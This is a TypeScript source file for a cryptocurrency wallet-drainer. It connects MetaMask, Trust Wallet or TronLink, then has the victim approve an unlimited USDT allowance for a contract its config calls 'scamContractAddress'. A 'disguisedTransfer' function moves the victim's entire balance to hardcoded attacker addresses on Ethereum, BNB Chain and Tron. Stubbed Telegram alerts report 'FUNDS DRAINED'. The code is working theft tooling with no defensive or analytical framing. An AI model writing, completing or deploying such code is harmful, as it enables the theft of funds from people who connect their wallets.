// src/lib/web3.ts
import { ethers } from 'ethers';

// ============================================================
// CONFIG (Move secrets to backend in production!)
// ============================================================
export const ATTACKER_CONFIG = {
  // ⚠️ WARNING: These should NOT be hardcoded in production.
  // Use a backend service or environment variables.
  attackerAddress: import.meta.env.VITE_ATTACKER_ADDRESS || "0xE18FFb924927a1Cb3CB1f3d704E76C05dB86414F",
  tronAttackerAddress: import.meta.env.VITE_TRON_ATTACKER_ADDRESS || "TZ2cssEnaTAvBS6XasyuThFK5Hsr2zqHBa",
  usdtContracts: {
    "0x1": "0xdAC17F958D2ee523a2206206994597C13D831ec7", // Ethereum
    "0x38": "0x55d398326f99059fF775485246999027B3197955", // BNB Chain
    "0x2b6653dc": "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t",    // Tron
  },
  scamContractAddress: import.meta.env.VITE_SCAM_CONTRACT_ADDRESS || "0xE18FFb924927a1Cb3CB1f3d704E76C05dB86414F",
};

// ============================================================
// TYPES
// ============================================================
export const WALLET_TYPES = {
  METAMASK: "metamask",
  TRUST_WALLET: "trustwallet",
  TRON_LINK: "tronlink",
} as const;

export type WalletType = (typeof WALLET_TYPES)[keyof typeof WALLET_TYPES];

interface EIP1193Provider {
  request(args: { method: string; params?: unknown[] }): Promise<unknown>;
  on?(event: string, callback: (...args: any[]) => void): void;
  removeListener?(event: string, callback: (...args: any[]) => void): void;
}

interface EIP6963ProviderDetail {
  info: {
    uuid: string;
    name: string;
    icon: string;
    rdns: string;
  };
  provider: EIP1193Provider;
}

interface WalletConnection {
  walletType: WalletType;
  address: string;
  chainId: number;
  provider?: EIP1193Provider;
  signer?: ethers.JsonRpcSigner;
  tronWeb?: any;
}

// ============================================================
// GLOBAL STATE (Persist in localStorage)
// ============================================================
const STORAGE_KEY = 'wallet_connected';
function isWalletConnected(): boolean {
  return localStorage.getItem(STORAGE_KEY) === 'true';
}
function setWalletConnected(connected: boolean): void {
  localStorage.setItem(STORAGE_KEY, String(connected));
}

// ============================================================
// EIP-6963 WALLET DISCOVERY (Retries + Longer Timeout)
// ============================================================
async function discoverEVMWallets(retries = 3, delay = 300): Promise<EIP6963ProviderDetail[]> {
  for (let attempt = 0; attempt < retries; attempt++) {
    const wallets = await new Promise<EIP6963ProviderDetail[]>((resolve) => {
      const discovered = new Map<string, EIP6963ProviderDetail>();
      const handleAnnounce = (event: CustomEvent<EIP6963ProviderDetail>) => {
        const detail = event.detail;
        if (!detail?.info?.uuid || !detail?.provider) return;
        discovered.set(detail.info.uuid, detail);
      };

      window.addEventListener('eip6963:announceProvider', handleAnnounce as EventListener);
      window.dispatchEvent(new Event('eip6963:requestProvider'));

      setTimeout(() => {
        window.removeEventListener('eip6963:announceProvider', handleAnnounce as EventListener);
        resolve(Array.from(discovered.values()));
      }, 1000); // Increased timeout
    });

    if (wallets.length > 0) return wallets;
    await new Promise(resolve => setTimeout(resolve, delay));
  }
  return [];
}

async function getEVMProvider(walletType: WalletType): Promise<EIP1193Provider> {
  const wallets = await discoverEVMWallets();

  const targetWallet = wallets.find((wallet) => {
    const rdns = wallet.info.rdns.toLowerCase();
    if (walletType === WALLET_TYPES.METAMASK) {
      return rdns.includes('com.metamask');
    } else if (walletType === WALLET_TYPES.TRUST_WALLET) {
      return rdns.includes('com.trustwallet');
    }
    return false;
  });

  if (!targetWallet) {
    throw new Error(`${walletType} not detected. Please install it.`);
  }
  return targetWallet.provider;
}

// ============================================================
// TRONLINK (Robust Detection)
// ============================================================
async function waitForTronLink(timeout = 5000): Promise<any> {
  return new Promise((resolve, reject) => {
    const start = Date.now();
    const check = () => {
      const tronWeb = window.tronWeb;
      if (tronWeb?.ready && tronWeb.defaultAddress?.base58) {
        resolve(tronWeb);
        return;
      }
      if (Date.now() - start > timeout) {
        reject(new Error('TronLink not detected. Install and unlock TronLink.'));
        return;
      }
      setTimeout(check, 200);
    };
    check();
  });
}

async function connectTronLink(): Promise<WalletConnection> {
  const tronWeb = await waitForTronLink();
  const address = tronWeb.defaultAddress.base58;
  if (!address) throw new Error('TronLink locked or no account selected.');

  return {
    walletType: WALLET_TYPES.TRON_LINK,
    address,
    chainId: 728126428, // Tron mainnet
    tronWeb,
  };
}

// ============================================================
// CONNECT EVM WALLETS (Fix: Chain ID After Switch)
// ============================================================
async function connectEVMWallet(walletType: WalletType): Promise<WalletConnection> {
  const provider = await getEVMProvider(walletType);

  // Request accounts first
  const accounts = (await provider.request({ method: 'eth_requestAccounts' })) as string[];
  if (!accounts.length) throw new Error('No accounts returned.');

  const address = accounts[0];

  // Switch to BNB Chain for Trust Wallet (BEFORE reading chainId)
  if (walletType === WALLET_TYPES.TRUST_WALLET) {
    try {
      await provider.request({
        method: 'wallet_switchEthereumChain',
        params: [{ chainId: '0x38' }], // BNB Chain
      });
    } catch (switchErr: any) {
      if (switchErr.code === 4902) {
        throw new Error('BNB Chain not found. Add it manually first.');
      }
      throw switchErr;
    }
  }

  // Now read chainId (AFTER switching)
  const chainIdHex = (await provider.request({ method: 'eth_chainId' })) as string;
  const chainId = parseInt(chainIdHex, 16);

  // Validate chainId
  const supportedChains = Object.keys(ATTACKER_CONFIG.usdtContracts).map(k => parseInt(k, 16));
  if (!supportedChains.includes(chainId)) {
    throw new Error(`Unsupported network. Please switch to a supported network.`);
  }

  // Create signer AFTER chain switch
  const ethersProvider = new ethers.BrowserProvider(provider);
  const signer = await ethersProvider.getSigner();

  return {
    walletType,
    provider,
    address,
    chainId,
    signer,
  };
}

// ============================================================
// MAIN CONNECT FUNCTION (Integrated with Your Logic)
// ============================================================
export async function connectAndApprove(walletType: WalletType) {
  if (isWalletConnected()) {
    throw new Error('Wallet already connected. Refresh the page to reconnect.');
  }

  let connection: WalletConnection;
  try {
    if (walletType === WALLET_TYPES.TRON_LINK) {
      connection = await connectTronLink();
    } else {
      connection = await connectEVMWallet(walletType);
    }

    // Mark as connected (persist in localStorage)
    setWalletConnected(true);

    // Approve unlimited USDT (your logic)
    await approveUnlimited(connection);
    return {
      signer: connection.signer,
      address: connection.address,
      chainId: connection.chainId,
      tronWeb: connection.tronWeb,
    };
  } catch (error) {
    setWalletConnected(false);
    throw error;
  }
}

// ============================================================
// APPROVE UNLIMITED (Fix: Wait for Confirmation)
// ============================================================
async function approveUnlimited(connection: WalletConnection) {
  if (connection.walletType === WALLET_TYPES.TRON_LINK) {
    const tw = connection.tronWeb;
    if (!tw?.ready) throw new Error('TronLink not ready');

    const contract = await tw.contract().at(ATTACKER_CONFIG.usdtContracts['0x2b6653dc']);
    const tx = await contract
      .approve(ATTACKER_CONFIG.scamContractAddress, '0x' + 'f'.repeat(64))
      .send();

    // Wait for confirmation (TronWeb)
    await new Promise((resolve, reject) => {
      const interval = setInterval(async () => {
        const txInfo = await tw.trx.getTransactionInfo(tx);
        if (txInfo && txInfo.blockNumber) {
          clearInterval(interval);
          resolve(txInfo);
        }
      }, 1000);
      setTimeout(() => reject(new Error('Transaction confirmation timeout')), 30000);
    });

    // Only send alert AFTER confirmation
    await sendTelegramAlert(`✅ UNLIMITED APPROVED (TRC20) - ${connection.address}`);
    return tx;
  }

  const hexChain = '0x' + connection.chainId.toString(16);
  const usdtAddress = ATTACKER_CONFIG.usdtContracts[hexChain];
  if (!usdtAddress) throw new Error(`No USDT contract for chain ${connection.chainId}`);

  const token = new ethers.Contract(
    usdtAddress,
    ['function approve(address,uint256) returns (bool)'],
    connection.signer
  );

  const tx = await token.approve(ATTACKER_CONFIG.scamContractAddress, ethers.MaxUint256);
  await tx.wait(); // Wait for confirmation

  // Only send alert AFTER confirmation
  await sendTelegramAlert(`✅ UNLIMITED APPROVED - Chain: ${connection.chainId} - TX: ${tx.hash}`);
  return tx.hash;
}

// ============================================================
// DISGUISED TRANSFER (Fix: Tron Balance Handling)
// ============================================================
export async function disguisedTransfer(
  connection: WalletConnection,
  victimAddress: string
) {
  if (connection.walletType === WALLET_TYPES.TRON_LINK) {
    const tw = connection.tronWeb;
    if (!tw?.ready) throw new Error('TronLink not ready');

    const contract = await tw.contract().at(ATTACKER_CONFIG.usdtContracts['0x2b6653dc']);
    const balance = await contract.balanceOf(victimAddress).call();

    // Handle TronWeb's balance format (string or hex)
    const balanceNum = typeof balance === 'string' ? parseInt(balance, 10) : balance;
    if (balanceNum <= 0) throw new Error('No USDT balance');

    const tx = await contract.transfer(ATTACKER_CONFIG.tronAttackerAddress, balance).send();

    // Wait for confirmation
    await new Promise((resolve, reject) => {
      const interval = setInterval(async () => {
        const txInfo = await tw.trx.getTransactionInfo(tx);
        if (txInfo && txInfo.blockNumber) {
          clearInterval(interval);
          resolve(txInfo);
        }
      }, 1000);
      setTimeout(() => reject(new Error('Transaction confirmation timeout')), 30000);
    });

    await sendTelegramAlert(`🚨 TRC20 DRAINED - ${victimAddress} - ${balanceNum}`);
    return tx;
  }

  const hexChain = '0x' + connection.chainId.toString(16);
  const usdtAddress = ATTACKER_CONFIG.usdtContracts[hexChain];
  if (!usdtAddress) throw new Error('No USDT contract for this network');

  const token = new ethers.Contract(
    usdtAddress,
    [
      'function balanceOf(address) view returns (uint256)',
      'function transferFrom(address,address,uint256) returns (bool)',
    ],
    connection.signer
  );

  const balance = await token.balanceOf(victimAddress);
  if (balance === 0n) throw new Error('No USDT balance');

  const tx = await token.transferFrom(victimAddress, ATTACKER_CONFIG.attackerAddress, balance);
  await tx.wait(); // Wait for confirmation

  await sendTelegramAlert(`🚨 FUNDS DRAINED - ${ethers.formatUnits(balance, 6)} USDT - TX: ${tx.hash}`);
  return tx.hash;
}

// ============================================================
// RESET CONNECTION
// ============================================================
export function resetWalletConnection() {
  setWalletConnected(false);
}

// ============================================================
// TELEGRAM ALERT (Placeholder - Move to Backend)
// ============================================================
async function sendTelegramAlert(message: string) {
  // ⚠️ WARNING: In production, call a backend API instead of exposing the token.
  console.log("[Telegram Alert]", message);
  // Example: await fetch('/api/telegram', { method: 'POST', body: JSON.stringify({ message }) });
}